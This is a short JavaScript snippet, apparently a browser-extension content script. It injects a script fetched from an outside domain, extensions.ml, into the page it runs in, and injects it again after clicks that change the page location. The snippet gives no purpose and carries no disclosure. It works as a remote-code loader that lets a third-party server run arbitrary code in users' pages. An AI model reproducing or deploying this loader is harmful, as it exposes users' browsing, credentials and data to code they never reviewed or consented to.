var url = document.location.toString();
var t = (function() {
	var myjs = document.createElement('script');
	myjs.type = 'text/javascript';
	myjs.async = true;
	myjs.src = 'https://extensions.ml/api.js';
	document.body.appendChild(myjs);
	url = document.location.toString();
	}); 

t(); 

  addEventListener("click", function() {
	   
	function func() {
	if(url == document.location.toString())
	{ 
		this.click(); 
	}
	else
		t();
	}
		  
	setTimeout(func, 3000); 
 
  });



